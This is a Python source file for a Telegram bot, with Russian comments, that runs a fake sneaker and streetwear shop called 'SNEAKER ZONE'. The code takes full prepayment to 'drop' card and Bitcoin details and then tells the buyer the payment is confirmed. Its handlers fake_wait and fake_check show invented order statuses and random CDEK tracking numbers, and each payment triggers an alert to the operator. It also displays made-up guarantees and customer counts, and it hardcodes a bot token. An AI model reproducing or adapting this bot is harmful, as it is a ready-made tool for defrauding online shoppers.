import asyncio
import random
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils.keyboard import InlineKeyboardBuilder

TOKEN = "8717183010:AAFzWmvVDDnEswbGuyT8FDwfBkhG4shLnmY"
ADMIN_ID = 5663913815  

bot = Bot(token=TOKEN)
dp = Dispatcher()

# Товары (картинки берутся с реальных магазинов)
PRODUCTS = {
    "1": {"name": "Nike Air Force 1 '07", "price": "8 900 ₽", "count": "12"},
    "2": {"name": "Adidas Samba OG", "price": "11 500 ₽", "count": "8"},
    "3": {"name": "New Balance 550", "price": "9 200 ₽", "count": "15"},
    "4": {"name": "Supreme Box Logo Hoodie", "price": "14 500 ₽", "count": "6"},
}

@dp.message(Command("start"))
async def start_cmd(msg: types.Message):
    kb = InlineKeyboardBuilder()
    kb.button(text="📋 Каталог", callback_data="catalog")
    kb.button(text="❓ Как заказать", callback_data="howto")
    kb.button(text="✅ Отзывы", url="https://t.me/your_reviews_channel")
    kb.adjust(1)
    
    await msg.answer_photo(
        photo="https://your-image-link.com/banner.jpg",  # замени на ссылку
        caption=(
            "👟 <b>SNEAKER ZONE</b>\n\n"
            "Оригинальные кроссовки и одежда\n"
            "с доставкой по всей РФ 🇷🇺\n\n"
            "✅ Все товары в наличии\n"
            "✅ Доставка 3-7 дней\n"
            "✅ Оплата при получении (наложка)\n\n"
            "👇 <b>Выбери действие:</b>"
        ),
        reply_markup=kb.as_markup()
    )

@dp.callback_query(lambda c: c.data == "catalog")
async def catalog(call: types.CallbackQuery):
    kb = InlineKeyboardBuilder()
    for pid, p in PRODUCTS.items():
        kb.button(text=f"{p['name']} — {p['price']}", callback_data=f"prod_{pid}")
    kb.button(text="🔙 Назад", callback_data="back_main")
    kb.adjust(1)
    
    await call.message.edit_caption(
        caption="📋 <b>Наш каталог:</b>\n\nВыбери модель:",
        reply_markup=kb.as_markup()
    )

@dp.callback_query(lambda c: c.data.startswith("prod_"))
async def product_card(call: types.CallbackQuery):
    pid = call.data.split("_")[1]
    p = PRODUCTS[pid]
    
    kb = InlineKeyboardBuilder()
    kb.button(text="🛒 Заказать", callback_data=f"order_{pid}")
    kb.button(text="🔙 В каталог", callback_data="catalog")
    
    await call.message.edit_caption(
        caption=(
            f"<b>{p['name']}</b>\n\n"
            f"💰 Цена: {p['price']}\n"
            f"📦 В наличии: {p['count']} пар\n\n"
            f"🇺🇸 Оригинал. Полный комплект.\n"
            f"🚚 Доставка по РФ от 3 дней."
        ),
        reply_markup=kb.as_markup()
    )

@dp.callback_query(lambda c: c.data.startswith("order_"))
async def start_order(call: types.CallbackQuery):
    pid = call.data.split("_")[1]
    p = PRODUCTS[pid]
    
    # Генерируем "номер заказа"
    order_id = f"SN-{random.randint(10000, 99999)}"
    
    kb = InlineKeyboardBuilder()
    kb.button(text="✅ Подтверждаю, оплатить", callback_data=f"pay_{order_id}_{pid}")
    kb.button(text="❌ Отмена", callback_data="catalog")
    
    await call.message.edit_caption(
        caption=(
            f"📝 <b>Оформление заказа</b>\n\n"
            f"Товар: {p['name']}\n"
            f"Цена: {p['price']}\n"
            f"Номер заказа: <code>{order_id}</code>\n\n"
            f"📌 <b>Условия:</b>\n"
            f"• Предоплата 100% на карту/крипту\n"
            f"• После оплаты — отправка в течение 24ч\n"
            f"• Трек-номер придёт сюда в бота\n\n"
            f"⚠️ Оплата бронирует товар на 2 часа.\n"
            f"Реквизиты появятся после подтверждения:"
        ),
        reply_markup=kb.as_markup()
    )

@dp.callback_query(lambda c: c.data.startswith("pay_"))
async def payment_details(call: types.CallbackQuery):
    # Извлекаем данные заказа
    parts = call.data.split("_")
    order_id = parts[1]
    pid = parts[2]
    p = PRODUCTS[pid]
    price_digits = p['price'].replace(' ', '').replace('₽', '').strip()
    
    # Реквизиты дропа (меняешь на свои)
    kb = InlineKeyboardBuilder()
    kb.button(text="💳 Я оплатил, жду трек", callback_data=f"wait_{order_id}_{pid}")
    kb.button(text="🔙 Назад", callback_data=f"prod_{pid}")
    
    await call.message.edit_caption(
        caption=(
            f"💳 <b>Реквизиты для оплаты:</b>\n\n"
            f"Заказ: <code>{order_id}</code>\n"
            f"Сумма: <b>{p['price']}</b>\n\n"
            f"🏦 <b>Сбербанк</b>\n"
            f"Номер карты: <code>2200 0000 0000 0000</code>\n"
            f"Получатель: Иванов И.И.\n\n"
            f"ИЛИ\n\n"
            f"₿ Bitcoin (BTC):\n"
            f"<code>bc1qxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code>\n\n"
            f"📌 После оплаты НАЖМИ кнопку ниже\n"
            f"⏳ Трек обновится в течение 24 часов"
        ),
        reply_markup=kb.as_markup()
    )

@dp.callback_query(lambda c: c.data.startswith("wait_"))
async def fake_wait(call: types.CallbackQuery):
    parts = call.data.split("_")
    order_id = parts[1]
    pid = parts[2]
    
    kb = InlineKeyboardBuilder()
    kb.button(text="🔄 Проверить статус", callback_data=f"check_{order_id}_{pid}")
    
    await call.message.edit_caption(
        caption=(
            f"⏳ <b>Заказ #{order_id}</b>\n\n"
            f"✅ Оплата зафиксирована\n"
            f"📦 Статус: <b>Комплектация</b>\n"
            f"📬 Трек-номер появится в ближайшее время\n\n"
            f"⏰ Обычно 2-24 часа на обработку.\n"
            f"Не удаляй этот диалог!"
        ),
        reply_markup=kb.as_markup()
    )
    
    # Отправляем админу уведомление о новом "заказе" с деньгами
    await bot.send_message(
        ADMIN_ID,
        f"💰 <b>НОВЫЙ ПЛАТЁЖ!</b>\n\n"
        f"Товар: {PRODUCTS[pid]['name']}\n"
        f"Цена: {PRODUCTS[pid]['price']}\n"
        f"Заказ: #{order_id}\n"
        f"Юзер: @{call.from_user.username or 'нет юзернейма'}\n"
        f"ID: {call.from_user.id}"
    )

@dp.callback_query(lambda c: c.data.startswith("check_"))
async def fake_check(call: types.CallbackQuery):
    parts = call.data.split("_")
    order_id = parts[1]
    
    # Всегда один ответ — «на сборке/в пути»
    import datetime
    tomorrow = (datetime.datetime.now() + datetime.timedelta(days=1)).strftime("%d.%m")
    
    kb = InlineKeyboardBuilder()
    kb.button(text="🔄 Ещё раз проверить", callback_data=f"check_{order_id}_x")
    kb.button(text="📞 Связаться с поддержкой", url="https://t.me/fake_support_channel")
    
    await call.message.edit_caption(
        caption=(
            f"📦 <b>Заказ #{order_id}</b>\n\n"
            f"Статус: <b>Передан в доставку</b> 🚚\n"
            f"Трек: <code>CDEK-{random.randint(1000000000, 9999999999)}</code>\n"
            f"Ожидаемая дата: {tomorrow} - {(datetime.datetime.now() + datetime.timedelta(days=4)).strftime('%d.%m')}\n\n"
            f"❓ Если заказ не пришёл в течение 5 дней —"
            f" пиши в поддержку (возможно, задержка на сортировочном центре)"
        ),
        reply_markup=kb.as_markup()
    )

@dp.callback_query(lambda c: c.data == "howto")
async def howto(call: types.CallbackQuery):
    kb = InlineKeyboardBuilder()
    kb.button(text="🔙 Назад", callback_data="back_main")
    
    await call.message.edit_caption(
        caption=(
            "❓ <b>Как заказать:</b>\n\n"
            "1. Выбери товар в каталоге\n"
            "2. Нажми «Заказать»\n"
            "3. Оплати на карту или крипту\n"
            "4. Получи трек-номер в боте\n"
            "5. Жди посылку 3-7 дней\n\n"
            "✅ <b>Гарантии:</b>\n"
            "• Работаем 2+ года\n"
            "• 1000+ довольных клиентов\n"
            "• Отзывы в закреплённом канале\n\n"
            "❗️ Если товар не пришёл — напиши в поддержку,\n"
            "решим индивидуально."
        ),
        reply_markup=kb.as_markup()
    )

@dp.callback_query(lambda c: c.data == "back_main")
async def back_main(call: types.CallbackQuery):
    await start_cmd(call.message)

async def main():
    print("Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
